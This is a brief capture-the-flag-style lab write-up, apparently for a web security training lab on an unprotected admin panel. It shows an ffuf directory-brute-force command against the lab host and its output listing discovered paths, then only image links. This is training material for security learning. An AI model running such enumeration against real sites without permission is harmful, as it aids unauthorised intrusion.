# Lab: Unprotected admin functionality

This lab has an unprotected admin panel. Solve the lab by deleting the user `carlos`.

```jsx
┌──(kali㉿Shieldbyte53)-[~]
└─$ ffuf -u https://0ae0006d03bc1ddc80d762a6000f0090.web-security-academy.net/FUZZ -w /usr/share/wordlists/dirb/common.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://0ae0006d03bc1ddc80d762a6000f0090.web-security-academy.net/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 10569, Words: 5024, Lines: 198, Duration: 157ms]
analytics               [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 145ms]
favicon.ico             [Status: 200, Size: 15406, Words: 11, Lines: 1, Duration: 149ms]
filter                  [Status: 200, Size: 10667, Words: 5059, Lines: 199, Duration: 150ms]
Login                   [Status: 200, Size: 3133, Words: 1309, Lines: 64, Duration: 149ms]
login                   [Status: 200, Size: 3133, Words: 1309, Lines: 64, Duration: 150ms]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 150ms]
my-account              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 147ms]
robots.txt              [Status: 200, Size: 45, Words: 3, Lines: 3, Duration: 148ms]
:: Progress: [4614/4614] :: Job [1/1] :: 47 req/sec :: Duration: [0:01:27] :: Errors: 0 ::
```

![image.png](Lab%20Unprotected%20admin%20functionality/image.png)

![image.png](Lab%20Unprotected%20admin%20functionality/image%201.png)